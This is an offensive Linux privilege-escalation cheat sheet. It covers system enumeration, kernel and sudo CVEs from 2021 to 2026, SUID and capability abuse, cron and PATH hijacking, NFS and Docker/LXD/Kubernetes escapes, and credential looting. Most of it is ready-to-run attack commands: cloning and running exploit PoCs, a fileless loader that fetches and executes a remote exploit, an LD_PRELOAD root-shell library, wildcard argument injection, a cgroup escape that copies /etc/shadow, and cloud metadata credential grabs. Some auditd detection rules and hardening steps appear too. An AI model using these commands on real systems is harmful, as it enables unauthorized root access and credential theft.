# Linux Privilege Escalation Cheat Sheet

A field reference for escalating from an unprivileged shell to root on modern
Linux systems. Emphasis on 2024-2026 vulnerabilities and techniques that still
work in the wild, with the classic misconfigurations that never go away.
Commands are kept terse; the surrounding notes explain the why and point at
the deeper rabbit holes.

---

## 1. Methodology in one paragraph

Once you land a low-priv shell, run the same three questions in order: **Who
am I and what can I run as someone else?** (`id`, `sudo -l`, capabilities),
**What is the box?** (`uname -a`, `/etc/os-release`, `ps aux`, mounted
shares), and **What can I write to that root will later execute or read?**
(writable scripts in root cron, writable service binaries, SUID/SGID paths,
PATH hijacks). Almost every successful privesc is one of: a kernel/container
CVE, a sudo/capability misconfig, a writable file that a privileged process
touches, or a stored credential. Enumerate in that order and you will rarely
miss the intended path.

---

## 2. Initial enumeration

### System and kernel

```
hostname
uname -a                       # kernel version + arch + build date
cat /proc/version               # compiler + kernel string
cat /etc/os-release             # distro, useful for matching CVEs
cat /etc/issue
uptime                          # load may hint at scheduled activity
arch                            # x86_64 vs aarch64, picks exploit binary
```

### Users and groups

```
id
who
w                              # who is logged in and what they run
last -F | head                 # recent logins
cat /etc/passwd | cut -d: -f1  # usernames
cat /etc/group | grep -E 'sudo|wheel|docker|lxd|disk'   # juicy groups
getent passwd | awk -F: '$3==0{print $1}'               # uid 0 accounts
grep -v 'nologin\|false' /etc/passwd                       # interactive shells
cat /etc/shadow                # if readable, jackpot
ls -l /home /root /var/mail     # per-user loot
```

### Processes and services

```
ps -ef
ps auxf                        # tree view, spot parent/child weirdness
ps -auxww | grep -iE 'root|nginx|sql|docker'
cat /etc/services
ss -tulpn                       # modern netstat replacement
netstat -tulpn                  # legacy fallback
netstat -antp
```

### Environment and history

```
env
echo $PATH
set
history
cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null
ls -la ~/.*rc ~/.*profile
find / -name '*.history' 2>/dev/null
```

### Network and mounts

```
ip a
ip route
ip neigh                        # ARP cache = neighbours on L2
ifconfig
netstat -r
cat /etc/hosts /etc/resolv.conf
cat /etc/fstab
mount | column -t
lsblk
df -h
cat /etc/exports                # NFS shares, see section 10
```

### Automated enum scripts (always run these first)

```
# LinPEAS - the most complete, colour-coded output
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer the binary: linpeas_amd64 (static Go build, no deps)

# LinEnum - classic, smaller
./LinEnum.sh -t -r report.txt -e /tmp/

# linux-exploit-suggester - kernel CVE matching
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl

# pspy - watch proc events without root, no ptrace needed
./pspy64 -pf -i 1000           # print file open events
./pspy32

# linux-smart-enumeration (lse)
./lse.sh -l 2                  # level 2 = intrusive

# ThatTotallyRealMyth/LinuxPrivEsc - the comprehensive reference
# Snoopy-Sec/Localroot-ALL-CVE - curated localroot archive by year
```

---

## 3. Kernel exploits

### Quick triage

```
uname -r
cat /proc/version
cat /etc/os-release
lsmod | grep -E 'nf_tables|overlay|io_uring|bpf|n_gsm'
cat /proc/sys/kernel/unprivileged_userns_clone   # 1 = userns allowed
cat /proc/sys/kernel/kptr_restrict               # 0 = kallsyms readable
cat /proc/sys/kernel/dmesg_restrict              # 0 = dmesg readable
cat /proc/sys/kernel/unprivileged_bpf_disabled   # 0 = BPF for all
cat /proc/sys/kernel/io_uring_disabled           # 0/1 = enabled
grep -E 'smep|smap' /proc/cpuinfo                 # absent = ret2usr possible
cat /boot/config-$(uname -r) | grep -E 'CONFIG_USER_NS|CONFIG_NF_TABLES|CONFIG_INIT_ON_ALLOC'
```

### Modern CVEs still seen in the wild (2024-2026)

| CVE | Range | Primitive | Notes |
|-----|-------|-----------|-------|
| CVE-2025-32463 | sudo 1.9.14-1.9.17 | chroot NSS lib load | Deterministic, CVSS 9.3 |
| CVE-2025-6018 | PAM 1.3.0-1.6.0 | polkit active session bypass | SUSE default, chained with 6019 |
| CVE-2025-6019 | udisks2 + libblockdev | XFS resize TOCTOU race | Root via SUID bash on XFS image |
| CVE-2025-27591 | Below observability tool | SUID/setgid abuse | LPE to tcg user then root |
| CVE-2025-49132 | Pterodactyl Panel <=1.11.10 | Unauth LFI to RCE | Web foothold, pearcmd chain |
| CVE-2024-1086 | kernel 5.14-6.6 | nf_tables UAF (Flipping Pages) | 99.4% reliable, flagship |
| CVE-2024-0582 | kernel 6.4-6.6.5 | io_uring PBUF UAF | Paired with SMEP bypass |
| CVE-2024-21626 | runc <1.1.12 | FD leak container escape | Leaky Vessels family |
| CVE-2023-6546 | kernel <6.5 | n_gsm tty race UAF | ZDI-CAN-20527 |
| CVE-2023-2640 + CVE-2023-32629 | Ubuntu OverlayFS | GameOver(lay) | Two-CVE chain |
| CVE-2023-0386 | kernel <6.2 | OverlayFS cap leak | FUSE + overlay chain |
| CVE-2023-2163 | various | eBPF verifier bypass | If unpriv BPF enabled |
| CVE-2022-0847 | kernel 5.8-5.16.11 | DirtyPipe | File write, trivial |
| CVE-2021-4034 | pkexec all versions | PwnKit | Universal, still unpatched in places |

### CVE-2025-32463 - sudo chroot LPE (CVSS 9.3)

Affects sudo 1.9.14 to 1.9.17. The `--chroot (-R)` option loads NSS
libraries from the chroot, so a user with chroot permission can plant a
malicious `libnss_*.so.2` and get a root shell. Deterministic, no race.

```
# Prebuilt exploit
curl -L https://github.com/Nowafen/CVE-2025-32463/releases/download/exploit/exploit -o exploit
chmod +x exploit && ./exploit --execution
# Or the Go PoC
git clone https://github.com/1xPwn/CVE-2025-32463
cd CVE-2025-32463 && go build && ./CVE-2025-32463
# Mitigation: update sudo, add "Defaults !use_chroot" to /etc/sudoers
```

### CVE-2025-6018 + CVE-2025-6019 - SUSE PAM bypass to udisks2 root

CVE-2025-6018 affects Linux-PAM 1.3.0-1.6.0 with `user_readenv=1` (default
on openSUSE/SLES 15). Inject `XDG_SEAT=seat0` and `XDG_VTNR=1` via
`~/.pam_environment` to make systemd-logind grant `allow_active` polkit
status over SSH, which is normally reserved for local console sessions.

```
# CVE-2025-6018 - PAM env injection
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
exit
ssh user@target          # fresh login re-reads PAM env
su - $USER               # re-trigger pam_env
# Mitigation: sed -i 's/user_readenv=1/user_readenv=0/g' /etc/pam.d/common-auth
```

CVE-2025-6019 is a TOCTOU race in udisks2/libblockdev XFS resize. The
temporary XFS mount during `Filesystem.Resize` lacks `nosuid`, so a crafted
XFS image with a SUID bash wins the race. Build the image with the victim's
own `/usr/bin/bash` (glibc ABI must match).

```
# Build XFS image on attacker (as root), using victim bash for ABI match
scp user@target:/usr/bin/bash /tmp/victim_bash
dd if=/dev/zero of=xfs.img bs=1M count=300
# SP5/SP6 (kernel 5.14/6.4):
mkfs.xfs -f -i exchange=0 -n parent=0 xfs.img
# SP1-SP4 (kernel 4.12-5.3):
mkfs.xfs -f -m crc=0,reflink=0 xfs.img
mkdir /tmp/mnt && mount -o loop,suid xfs.img /tmp/mnt
cp /tmp/victim_bash /tmp/mnt/xpl && chmod 4755 /tmp/mnt/xpl && chown root:root /tmp/mnt/xpl
umount /tmp/mnt
scp xfs.img user@target:/tmp/

# Trigger on target
git clone https://github.com/DesertDemons/CVE-2025-6018-6019
cd CVE-2025-6018-6019 && chmod +x exploit.sh && ./exploit.sh
# Or protofile-based racer:
git clone https://github.com/JM00NJ/CVE-2025-6019-udisks2-XFS-Resize-TOCTOU-Privilege-Escalation
```

Reliability: usually wins in 1-3 attempts. Unstable on heavy network I/O.
XFS format flags differ by SUSE service pack, check the kernel version first.

### CVE-2025-27591 - Below observability tool LPE

Affects the Below tool (Facebook's Linux observability tool). SUID/setgid
component abuse to escalate to the `tcg` user and then root.

```
git clone https://github.com/MoTechStore/CVE-2025-27591-PoC
cd CVE-2025-27591-PoC && chmod +x exp.sh && ./exp.sh
su tcg              # password: NewPassword123!
# Customise password with: openssl passwd -6
```

### CVE-2024-1086 - nf_tables UAF (Notselwyn, flagship)

Affects kernel 5.14 to 6.6 (excludes patched 5.15.149+, 6.1.76+, 6.6.15+).
Underlying vuln goes back to 3.15. The "Flipping Pages" technique uses
userfaultfd to win a UAF on `nft_verdict` and flip page tables. 99.4%
success rate on KernelCTF images. Requires `CONFIG_USER_NS=y`,
`unprivileged_userns_clone=1`, `CONFIG_NF_TABLES=y`, x86_64. Does NOT work
with `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` on 6.4+ (Ubuntu 6.5).

```
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086 && make
./exploit
id   # expect uid=0

# Fileless via Perl memfd
perl -e 'require qw/syscall.ph/; my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd"; exec {"/proc/$$/fd/$fd"} "memfd";'
```

Notes: deliberately leaves a kernel panic after the root shell to deter
malicious use. Unstable on systems with heavy WiFi activity. Set
`CONFIG_REDIRECT_LOG=1` over SSH. Tweak `CONFIG_PHYS_MEM` for >32GiB RAM.

### CVE-2024-0582 - io_uring PBUF UAF

Affects kernel 6.4 to 6.6.5 and 6.7-rc1-rc3. UAF in io_uring pbuf ring
registration via mmap then free. Often paired with a separate SMEP bypass
primitive. Patch commit `c392cbecd8eca4c53f2bf508731257d9d0a21c2d`.

### CVE-2024-21626 - runc Leaky Vessels container escape

Affects runc <1.1.12. File descriptor leak from runc lets the container
access the host filesystem. Check with `runc --version`.

### DirtyPipe (CVE-2022-0847) one-shot

```
gcc -o dirtypipe exploit.c
./dirtypipe /etc/passwd 1 $'toor:$1$salt$<hash>:0:0:root:/root:/bin/bash\n'
su toor
```

### PwnKit (CVE-2021-4034) - still works on unpatched boxes

```
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
./pwnkit           # instant root on unpatched pkexec
```

### Kernel exploit hardening checklist (defender side, useful to know)

```
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled
echo 1 > /proc/sys/kernel/unprivileged_userns_clone   # Debian/Ubuntu
sysctl -w kernel.io_uring_disabled=2                    # disable io_uring
```

---

## 4. Sudo misconfigurations

```
sudo -l
sudo -l -n                          # non-interactive, no password prompt
sudo -V                             # version, match against CVEs
cat /etc/sudoers 2>/dev/null
ls -l /etc/sudoers /etc/sudoers.d/
grep -R '' /etc/sudoers /etc/sudoers.d/ 2>/dev/null
```

### GTFOBins lookup

For every entry in `sudo -l`, check <https://gtfobins.github.io>. Common wins:

```
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.execl("/bin/sh","sh","-p")'
sudo vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
sudo bash -p
sudo less /etc/passwd        # then !sh inside less
sudo env PATH=/tmp:$PATH <cmd>   # if cmd calls relative binaries
```

### Wildcard injection (sudo tar/zip with wildcards)

If sudo runs `tar czf backup.tar *` from a writable dir, inject args via
filenames:

```
cd /path/that/sudo/backs/up
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
chmod +x shell.sh
# wait for the cron/sudo run, then /tmp/rootbash -p
```

Same trick applies to `zip`, `rsync --files-from`, `chmod` with `--reference`.

### LD_PRELOAD / LD_LIBRARY_PATH

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```
cat > shell.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <any-sudo-binary>
```

For `LD_LIBRARY_PATH`, name your `.so` after the shared lib the binary loads
(`ldd <binary>`), build a backdoored version, and run via sudo.

### Sudo CVEs

```
sudo -V
# Baron Samedit (CVE-2021-3156) affects sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
# heap overflow in sudoedit parsing, no auth needed
git clone https://github.com/blasty/CVE-2021-3156
# CVE-2025-32463 sudo chroot, see section 3
```

---

## 5. SUID / SGID

```
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
find / -perm -04000 -ls 2>/dev/null
find / -perm -6000 -type f 2>/dev/null            # both
# Compare every hit against gtfobins
```

### Unusual SUID = custom binary worth reversing

```
file /opt/weird/suidbin
strings /opt/weird/suidbin | less
# Look for system(), popen(), execve(), or relative path calls
# Try ltrace / strace to see what it opens and spawns
strace /opt/weird/suidbin 2>&1 | grep -E 'exec|open|access'
```

### /etc/passwd and /etc/shadow

```
ls -l /etc/passwd /etc/shadow
# /etc/shadow readable  -> john/unshadow + wordlist
# /etc/passwd writable  -> inject a root user
openssl passwd -1 -salt pwn password123
# then append:  pwn:$1$pwn$<hash>:0:0:root:/root:/bin/bash
```

Cracking hashes:

```
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=rockyou.txt hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt            # sha512crypt
hashcat -m 500  hashes.txt rockyou.txt            # md5crypt
```

---

## 6. Capabilities

Capabilities are finer-grained root privileges. SUID scan will NOT show them,
run `getcap` separately.

```
getcap -r / 2>/dev/null
capsh --print                                   # current process caps
ls -l /usr/bin/* | grep cap_                     # extended attrs
```

### Dangerous capabilities and what they buy you

| Capability | Effect |
|-----------|--------|
| `cap_setuid` | Change uid, become root directly |
| `cap_setgid` | Change gid |
| `cap_sys_admin` | Mount, namespaces, many root-like ops |
| `cap_dac_read_search` | Bypass file read ACLs |
| `cap_dac_override` | Bypass file write ACLs |
| `cap_sys_ptrace` | Read/inject into other processes |
| `cap_net_raw` | Raw sockets, packet capture |
| `cap_net_admin` | Network config, netfilter, used by nf_tables CVEs |
| `cap_sys_module` | Load kernel modules |
| `cap_bpf` | Load BPF programs, kernel attack surface |

### Examples

```
# cap_setuid on a binary -> spawn root shell
getcap -r / 2>/dev/null | grep cap_setuid
# e.g. /usr/bin/python3.10 cap_setuid=eip
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'

# cap_sys_admin -> mount a tmpfs overlay or abuse namespaces
# cap_dac_read_search -> read /etc/shadow directly
/usr/bin/somebin < /etc/shadow
```

---

## 7. Cron and timers

```
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron*
crontab -l
for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null; done
systemctl list-timers --all
cat /var/log/syslog /var/log/cron 2>/dev/null
pspy64 -pf -i 1000                  # watch cron spawns without root
```

### Writable script in a root cron job

```
ls -l /path/to/cron/script.sh
# If world-writable:
echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /path/to/cron/script.sh
# Wait for the run, then:
/tmp/rb -p
```

### Wildcards in cron (tar/zip), see section 4 wildcard trick.

---

## 8. PATH hijacking

```
find / -writable 2>/dev/null | grep -vE '/proc|/sys|/dev'
find / -perm -222 -type d 2>/dev/null          # world-writable dirs
find / -perm -o w -type d 2>/dev/null
find / -perm -o x -type d 2>/dev/null
```

If a SUID/cron binary calls an unqualified program (`system("service xyz")`),
place your backdoored binary first in PATH:

```
echo '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# trigger the binary, then /tmp/rb -p
```

Add a writable PATH dir to `~/.bashrc` or `/etc/profile` for persistence.

---

## 9. NFS no_root_squash

```
cat /etc/exports
# A line like  /share  *(rw,no_root_squash)  is exploitable
showmount -e <target-ip>          # from attacker box
mkdir /tmp/mnt
mount -o rw <target-ip>:/share /tmp/mnt
# Build a SUID shell on the attacker as root:
cp /bin/bash /tmp/mnt/rootbash
chmod 4755 /tmp/mnt/rootbash
# On the target:
/target/share/rootbash -p
```

Variants: `no_all_squash` with a matching uid, or writable NFS home dirs for
ssh key injection.

```
# Enumerate NFS without credentials
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-rootkit -sV <ip>
rpcinfo -p <ip>
```

---

## 10. Docker / container escapes

### Group membership

```
id | grep -E 'docker|lxd|disk'
```

### Docker socket or group

```
docker ps
docker run -v /:/host -it alpine chroot /host sh           # classic
docker run -it --rm --privileged -v /:/host ubuntu chroot /host bash
# Without the docker client:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Containerd / ctr

```
ctr images list
ctr run --rm -t --privileged --mount type=bind,src=/,dst=/host,ro=false \
  docker.io/library/ubuntu:latest esc /bin/bash
chroot /host sh
```

### Capabilities inside a container

```
capsh --print                  # check if cap_sys_admin etc present
# If cap_sys_admin or privileged, use the cgroup release_agent escape:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /etc/shadow > $host_path/shadow" >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### runc CVE-2024-21626 (Leaky Vessels)

```
runc --version                  # < 1.1.12 vulnerable
# Exploit uses a leaked fd from runc to access host fs
```

### rclone GHSA-945v-v9p3-v5xw (2026)

`--metadata` honors attacker-controlled uid/mode, allowing a SUID binary to
be planted from an untrusted remote mount. Relevant to container escape
workflows where rclone mounts attacker-controlled storage.

### Kubernetes pod escape

```
ls -l /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token
env | grep KUBE
# If token present, talk to the API:
curl -k -H "Authorization: Bearer $(cat .../token)" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
# Privileged pod? mount host fs:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

CVE-2026-10059 and CVE-2026-10090 affect the Multicluster Engine for
Kubernetes and the Application Subscription controller, allowing tenant to
cluster-admin escalation in multi-tenant clusters.

### LXD / LXC group

```
lxc image list
# Build a container that mounts host root:
lxc init ubuntu:20.04 esc -c security.privileged=true
lxc config device add esc root disk source=/ path=/mnt
lxc start esc
lxc exec esc -- /bin/bash
# Host fs now under /mnt inside the container
```

---

## 11. Stored credentials and config loot

```
find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head
grep -RIlE 'password|passwd|secret|api[_-]?key|token' /opt /var/www /home 2>/dev/null
find / -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null
find / -name '.env' -o -name 'wp-config.php' -o -name 'config.php' 2>/dev/null
# Databases
mysql -u root -p'' 2>/dev/null -e 'show databases;'
psql -U postgres -c '\l'
# Cloud metadata
curl -s http://169.254.169.254/latest/meta-data/         # AWS IMDSv1
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/
curl -s -H 'Metadata: true' "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
# Git history
find / -name '.git' -type d 2>/dev/null
git -C /var/www show HEAD                               # secrets in commits
```

---

## 11a. 2026 Linux LPE campaign (Copy Fail, Dirty Frag, RefluXFS, and friends)

2026 produced a wave of named Linux LPE exploits that share a common
theme: corrupting the in-memory page cache of read-only files (like
`/usr/bin/su` or `/etc/passwd`) so that the on-disk file stays untouched
and file integrity monitoring (AIDE, Tripwire) sees nothing. These are
fileless LPEs in the same vein as DirtyPipe (CVE-2022-0847) but with
broader reach and no race window. The naming convention (Copy Fail,
Dirty Frag, RefluXFS, PinTheft, CIFSwitch, GhostLock, Pedit COW) comes
from the researchers and tracking sites at kimmo.cloud.

### CVE-2026-31431 - Copy Fail (algif_aead page-cache corruption)

A logic flaw in the user-space crypto interface (`algif_aead`) present
since 2017. Lets a local user corrupt the page cache of setuid binaries
or escape containers to get root privileges. Uses `splice(2)` to place a
page-cache page of a target file into a pipe, then an in-place crypto
STORE on the kernel crypto path writes attacker-controlled bytes onto
that page. Deterministic, no race.

```
git clone https://github.com/suominen/CVE-2026-31431
# Tracker: https://kimmo.cloud/CVE-2026-31431/
# Rust PoC: https://github.com/Dullpurple-sloop726/CVE-2026-31431-Linux-Copy-Fail
```

### CVE-2026-43284 + CVE-2026-43500 - Dirty Frag (IPsec ESP and RxRPC)

Two deterministic logic bugs in the Linux kernel networking and IPsec/
RxRPC subsystems enabling local page-cache corruption and root
escalation. Both use the same root pattern as Dirty Pipe and Copy Fail:
`splice(2)` places a page-cache page into the `frag` slot of a sender-side
`sk_buff`, then receive-side kernel code performs an in-place crypto
STORE on top of that frag, mutating the page cache in RAM. No disk write
occurs. Deterministic, no race window, no kernel panic on failure.

CVE-2026-43284 (ESP variant, CVSS 8.8): `crypto_authenc_esn_decrypt()` in
`esp_input()`. Trigger via `socket(AF_INET)` with UDP encapsulation, then
`xfrm_input()`. The vulnerable `skip_cow` branch bypasses
`skb_cow_data()` and performs in-place AEAD decryption with the
page-cache page as both source and destination. The attacker controls
both the location (splice offset) and the 4-byte value (the high-order
32 bits of the ESN set via `XFRMA_REPLAY_ESN_VAL`). Authentication
verification runs after the store. Requires `CAP_NET_ADMIN` and
`unshare(CLONE_NEWUSER|CLONE_NEWNET)`. Affected range: commit
`cac2661c53f3` (2017-01) to `f4c50a4034e6` (patched 2026-05-05).

CVE-2026-43500 (RxRPC variant, CVSS 7.8): `rxkad_verify_packet_1()`
performs a single-block `pcbc(fcrypt)` decrypt directly on the
splice-pinned skb frag without copying first. The attacker picks a
session key (`add_key("rxrpc", ...)`) so that `decrypt(ciphertext)` equals
`desired_plaintext`. Produces an 8-byte STORE. No user namespace
required. Needs the `rxrpc.ko` module (loaded by default on Ubuntu).
Affected range: commit `2dc334f1a63a` (2023-06) to `aa54b1d27fe0`
(patched 2026-05-10).

The public PoC targets `/usr/bin/su`. It writes 48 ESP stores of 4 bytes
each (192 bytes at file offset 0), replacing the first page-cache bytes
with a static root-shell ELF. The ELF entry point runs
`setgid(0); setuid(0); setgroups(0,NULL); execve("/bin/sh", ...)`. A
single `execve("/usr/bin/su")` then yields a root shell.

```
git clone https://github.com/V4bel/dirtyfrag
cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
# Lab reproduction repo with detection, mitigation, YARA, Sigma:
git clone https://github.com/kuniyal08/Dirty-Frag-CVE-2026-43284
# Non-destructive pre-flight checker
python3 poc/check_vulnerable.py
# CERT advisory: VU#980487
# Mitigation: blacklist esp4, esp6, rxrpc modules
echo -e "blacklist esp4\nblacklist esp6\nblacklist rxrpc\nalias esp4 off\nalias esp6 off\nalias rxrpc off" > /etc/modprobe.d/dirtyfrag.conf
echo 3 | sudo tee /proc/sys/vm/drop_caches   # flush poisoned page cache
# Note: disabling esp4/esp6 breaks IPsec VPNs, rxrpc breaks AFS.
```

Detection (auditd):
```
-a always,exit -F arch=b64 -S socket -F a0=38 -F uid!=0 -k dirtyfrag_af_alg
-a always,exit -F arch=b64 -S socket -F a0=33 -F uid!=0 -k dirtyfrag_rxrpc
-a always,exit -F arch=b64 -S splice -F uid!=0 -k dirtyfrag_splice
-a always,exit -F arch=b64 -S unshare -F uid!=0 -k dirtyfrag_namespace
-w /usr/bin/su -p r -k dirtyfrag_suid_read
```
AF_ALG = 38, AF_RXRPC = 33 on Linux. File integrity monitoring is blind
because no disk write occurs.

### CVE-2026-64600 - RefluXFS (XFS reflink CoW race)

A race condition in the XFS copy-on-write path on reflink-enabled volumes
that allows unprivileged users to overwrite readable files. Discovered by
Qualys, affects XFS 0.6.1 and later with reflink enabled. Exploits a race
in the CoW path that lets an attacker overwrite the page cache of a
read-only file on a reflink-enabled XFS volume.

```
git clone https://github.com/masrikky/CVE-2026-64600-RefluXFS
# Writeup: https://noted.my.id/article/cve-2026-64600-refluxfs
gcc -o refluxfs refluxfs.c && ./refluxfs
```

### CVE-2026-46333 - p-Trace / pidfd_getfd flaw

A logic bug in `__ptrace_may_access()` letting local users capture file
descriptors from dying privileged processes. The `pidfd_getfd` syscall
has a check against `__ptrace_may_access()` but a race lets you grab an fd
from a privileged process that is in the middle of dying, before the
access check sees the new (lower) credentials. This fd can be a handle to
`/etc/shadow`, a socket with privileged credentials, or a pipe to another
privileged process. Capture it and read or write as that process.

### CVE-2026-46331 - Pedit COW (traffic-control act_pedit)

A Linux kernel LPE in the traffic-control subsystem. The flaw exists in
the `act_pedit` packet-editing action, where the kernel may calculate the
copy-on-write writable range incorrectly before all runtime packet
offsets are fully known. Under the right local conditions this can allow
writes into shared page cache memory. An unprivileged local user can
poison the in-memory cached copy of a setuid-root binary such as
`/bin/su`. The original file on disk is not modified, so file-integrity
checks may still look clean.

```
git clone https://github.com/cherrycherrymay/PoC-CVE-2026-46331
# TuxCare analysis and NVD entry linked in the repo
```

### CVE-2026-43494 + CVE-2026-43502 - PinTheft (RDS zerocopy double-free)

RDS zerocopy double-free privilege escalation. The RDS (Reliable Datagram
Sockets) subsystem has a double-free in its zerocopy path that can be
abused for arbitrary kernel read/write, leading to root.

```
git clone https://github.com/suominen/pintheft
# Tracker: https://kimmo.cloud/pintheft/
```

### CVE-2026-46243 - CIFSwitch (CIFS cifs.spnego key-origin)

CIFS `cifs.spnego` key-origin privilege escalation. A flaw in how the
CIFS client derives the origin of Kerberos SPNEGO keys allows a local
attacker to influence key derivation and escalate.

```
git clone https://github.com/suominen/cifswitch
# Tracker: https://kimmo.cloud/cifswitch/
```

### CVE-2026-43499 - GhostLock (MediaTek kernel lock)

A kernel privilege escalation via a lock flaw on MediaTek Dimensity
devices (and possibly other ARM platforms). PoC targets POCO F3 GT
(aresin), MediaTek Dimensity 1200, Linux 4.14.186 ARM64 kernel.

```
git clone https://github.com/NothingFumo/ghostlock-aresin
```

### CVE-2026-52943 - skbuff UAF (use-after-free in skbuff.c)

A use-after-free in `skbuff.c` (commit
`98d0912e9f841e5529a5b89a972805f34cb1c69d`). PoC targets LTS 6.12.89 and
Oracle Linux UEK R8 (`6.12.0-202.76.4.2`).

```
git clone https://github.com/vn-lazyming/CVE-2026-52943
cd CVE-2026-52943 && ./setup.sh && ./run.sh
# Writeup: https://hackmd.io/@mlc0cVjxSwqv0OoxsUYccw/Bk99YYTyzx
```

### CVE-2026-8933 - snap-confine (Ubuntu default sandbox race)

A race condition during sandbox initialization impacting default Ubuntu
installations. `snap-confine` is the setuid helper that the snapd
framework uses to set up the sandbox for snap applications. A race during
initialization can be abused to escape the sandbox on default Ubuntu
installs where snapd is present.

### CVE-2026-14459 + CVE-2026-14460 - Pardus Software LPE

Pardus Software Center local privilege escalation. Affects Pardus Linux
distribution's software center <= 1.0.4. The helper runs as root and can
be abused by a local user to execute arbitrary commands as root.

```
git clone https://github.com/dasokkk/CVE-2026-14459-14460-pardus-software
```

### 2026 page-cache LPE detection pattern

All the page-cache corruption bugs (Copy Fail, Dirty Frag, RefluXFS,
Pedit COW) share the same detection blind spot: file integrity monitoring
sees nothing because no disk write occurs. The corruption lives only in
RAM. Detection must happen at the syscall layer:

```
# auditd rules for the shared splice + crypto pattern
-a always,exit -F arch=b64 -S splice -F uid!=0 -k page_cache_lpe
-a always,exit -F arch=b64 -S vmsplice -F uid!=0 -k page_cache_lpe
-a always,exit -F arch=b64 -S socket -F a0=38 -F uid!=0 -k af_alg_abuse
-a always,exit -F arch=b64 -S socket -F a0=33 -F uid!=0 -k rxrpc_abuse
-a always,exit -F arch=b64 -S unshare -F uid!=0 -k namespace_abuse
-w /usr/bin/su -p r -k su_read_abuse
-w /bin/su -p r -k su_read_abuse
-w /etc/passwd -p r -k passwd_read_abuse
```

After suspected exploitation, flush and verify:
```
echo 3 | sudo tee /proc/sys/vm/drop_caches
sha256sum /usr/bin/su                    # should match the package hash
dpkg -V util-linux                       # should produce no output
# If the hash differs after drop_caches, the on-disk file was modified.
# If the hash matches after drop_caches, only the page cache was poisoned.
```

### 2026 LPE decision matrix additions

| You have | Target shows | Try first |
|----------|--------------|----------|
| Local user | Kernel since 2017, af_alg crypto | CVE-2026-31431 Copy Fail |
| Local user | Kernel < May 2026, esp4/esp6 + userns | CVE-2026-43284 Dirty Frag ESP |
| Local user | Kernel < May 2026, rxrpc.ko loaded | CVE-2026-43500 Dirty Frag RxRPC |
| Local user | XFS reflink enabled | CVE-2026-64600 RefluXFS |
| Local user | Kernel with act_pedit, traffic-control | CVE-2026-46331 Pedit COW |
| Local user | Kernel with RDS sockets | CVE-2026-43494 PinTheft |
| Local user | CIFS mount, cifs.spnego | CVE-2026-46243 CIFSwitch |
| Local user | MediaTek ARM64 kernel 4.14 | CVE-2026-43499 GhostLock |
| Local user | Kernel 6.12.x, skbuff | CVE-2026-52943 skbuff UAF |
| Local user | Ubuntu with snapd | CVE-2026-8933 snap-confine |
| Local user | Pardus Software Center <=1.0.4 | CVE-2026-14459/14460 |

---

## 12. Quick decision matrix

| You have | Target shows | Try first |
|----------|--------------|----------|
| Any local user | sudo 1.9.14-1.9.17, sudo -R allowed | CVE-2025-32463 |
| SSH user | openSUSE/SLES 15, pam_env + udisks2 | CVE-2025-6018 then 6019 |
| Local user | Below observability tool SUID | CVE-2025-27591 |
| Web foothold | Pterodactyl <=1.11.10 + PEAR | CVE-2025-49132 |
| Local user | Kernel 5.14-6.6, userns enabled | CVE-2024-1086 |
| Local user | Kernel 6.4-6.6.5, io_uring | CVE-2024-0582 |
| Local user | Kernel <6.5, n_gsm reachable | CVE-2023-6546 |
| Container | runc <1.1.12 | CVE-2024-21626 |
| docker/lxd group | Container host | docker run -v /:/mnt / lxc |
| Unpatched pkexec | Any | CVE-2021-4034 PwnKit |
